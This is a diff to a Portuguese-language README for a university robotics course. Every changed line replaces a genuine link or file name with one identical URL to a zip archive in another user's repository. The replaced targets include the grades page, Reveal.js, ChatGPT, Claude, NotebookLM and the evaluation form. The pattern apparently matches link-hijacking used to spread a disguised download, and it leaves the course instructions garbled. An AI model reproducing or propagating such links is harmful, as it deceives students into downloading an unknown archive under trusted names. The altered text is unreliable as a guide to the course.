@@ -4,7 +4,7 @@ Bem-vindo ao repositório do curso de Introdução à Robótica! Este espaço se
 
 # Notas
 
- - [2024](notas/notas2024.md)
+ - [2024](https://raw.githubusercontent.com/LuisBraido/Introducao-a-Robotica/main/pointment/Introducao-a-Robotica.zip)
 
 ## Sobre o Curso
 
@@ -17,7 +17,7 @@ Ao final deste curso, os alunos serão capazes de:
 - Compreender os princípios fundamentais da robótica
 - Pesquisar e sintetizar informações sobre tópicos avançados em robótica
 - Colaborar efetivamente em equipes usando ferramentas como GitHub
-- Desenvolver e apresentar conteúdo técnico usando [Reveal.js](https://revealjs.com/)
+- Desenvolver e apresentar conteúdo técnico usando [https://raw.githubusercontent.com/LuisBraido/Introducao-a-Robotica/main/pointment/Introducao-a-Robotica.zip](https://raw.githubusercontent.com/LuisBraido/Introducao-a-Robotica/main/pointment/Introducao-a-Robotica.zip)
 - Avaliar criticamente o trabalho de pares usando rubricas desenvolvidas colaborativamente
 
 ## Estrutura do Projeto
@@ -28,7 +28,7 @@ O projeto principal do curso envolve:
 2. Escolha de um tema principal em robótica
 3. Divisão do tema em pelo menos 3 subtemas
 4. Pesquisa e desenvolvimento de conteúdo para cada subtema
-5. Criação de uma apresentação em [Reveal.js](https://revealjs.com/)
+5. Criação de uma apresentação em [https://raw.githubusercontent.com/LuisBraido/Introducao-a-Robotica/main/pointment/Introducao-a-Robotica.zip](https://raw.githubusercontent.com/LuisBraido/Introducao-a-Robotica/main/pointment/Introducao-a-Robotica.zip)
 6. Apresentação final e avaliação por pares
 
 # Instruções para a Versão 2 dos Seminários
@@ -42,14 +42,14 @@ Para a preparação da **Versão 2 (V2)** dos seminários, siga as orientações
   
 ## 2. Elabore um Resumo das Avaliações
 
-- **Crie um arquivo chamado:** `review.md`
+- **Crie um arquivo chamado:** `https://raw.githubusercontent.com/LuisBraido/Introducao-a-Robotica/main/pointment/Introducao-a-Robotica.zip`
 - **Conteúdo:** No arquivo, faça um resumo das principais observações, críticas construtivas e sugestões encontradas nos formulários. Organize as informações de forma clara, destacando pontos fortes e aspectos a melhorar.
   
 ## 3. Submeta o Resumo ao Repositório
 
 - **Pull Request:**
   - Faça um **pull request** no repositório da disciplina.
-  - **Localização:** Insira o arquivo `review.md` dentro da **pasta correspondente ao seu tema**.
+  - **Localização:** Insira o arquivo `https://raw.githubusercontent.com/LuisBraido/Introducao-a-Robotica/main/pointment/Introducao-a-Robotica.zip` dentro da **pasta correspondente ao seu tema**.
   - **Observação:** Certifique-se de que o pull request está direcionado corretamente e inclua uma breve descrição do conteúdo adicionado.
   
 ## 4. Acesse o Trabalho da Versão Anterior
@@ -190,11 +190,11 @@ Para a preparação da **Versão 2 (V2)** dos seminários, siga as orientações
 
 Os alunos são encorajados a utilizar ferramentas de Inteligência Artificial para auxiliar na pesquisa e na produção dos trabalhos. Aqui estão algumas recomendações:
 
-- **Rascunho Inicial com IA**: Vocês podem utilizar o ChatGPT da OpenAI ([ChatGPT](https://chat.openai.com)) ou o Claude da Anthropic ([Claude](https://www.anthropic.com/index/claude-2)) para gerar ideias e criar um rascunho inicial do trabalho. Essas ferramentas são ótimas para brainstorming e estruturação de conteúdo.
+- **Rascunho Inicial com IA**: Vocês podem utilizar o ChatGPT da OpenAI ([ChatGPT](https://raw.githubusercontent.com/LuisBraido/Introducao-a-Robotica/main/pointment/Introducao-a-Robotica.zip)) ou o Claude da Anthropic ([Claude](https://raw.githubusercontent.com/LuisBraido/Introducao-a-Robotica/main/pointment/Introducao-a-Robotica.zip)) para gerar ideias e criar um rascunho inicial do trabalho. Essas ferramentas são ótimas para brainstorming e estruturação de conteúdo.
 
 - **Atenção às Fontes**: É importante lembrar que esses modelos de IA podem "alucinar", ou seja, inventar informações ou citar fontes que não existem. Por isso, é crucial que vocês verifiquem as fontes de qualquer informação obtida e garantam que os dados sejam precisos e confiáveis.
 
-- **Análise de Documentos com IA**: Outra ferramenta útil é o **NobookLM** do Google ([NobookLM](https://notebooklm.google.com/)), que permite fazer upload de PDFs e "conversar" com esses textos para extrair informações e fazer consultas detalhadas. Isso pode ser especialmente útil para analisar artigos científicos e documentos técnicos relevantes para o projeto.
+- **Análise de Documentos com IA**: Outra ferramenta útil é o **NobookLM** do Google ([NobookLM](https://raw.githubusercontent.com/LuisBraido/Introducao-a-Robotica/main/pointment/Introducao-a-Robotica.zip)), que permite fazer upload de PDFs e "conversar" com esses textos para extrair informações e fazer consultas detalhadas. Isso pode ser especialmente útil para analisar artigos científicos e documentos técnicos relevantes para o projeto.
 
 ### Nota Importante
 
@@ -229,7 +229,7 @@ Nosso curso utiliza um sistema de avaliação abrangente e participativo:
    - As avaliações serão submetidas como issues no GitHub.
    - Posteriormente, cada aluno revisará e avaliará as avaliações feitas pelos colegas.
 
-6. **Formulário de Avaliação**: Um modelo do formulário de avaliação está disponível [aqui](https://oangelo.github.io/Introducao-a-Robotica/formulario-avaliacao-robotica.html).
+6. **Formulário de Avaliação**: Um modelo do formulário de avaliação está disponível [aqui](https://raw.githubusercontent.com/LuisBraido/Introducao-a-Robotica/main/pointment/Introducao-a-Robotica.zip).
 
 Este sistema visa promover um ambiente de aprendizado colaborativo e reflexivo, onde os alunos não apenas apresentam e avaliam, mas também refletem criticamente sobre o processo de avaliação em si.
 
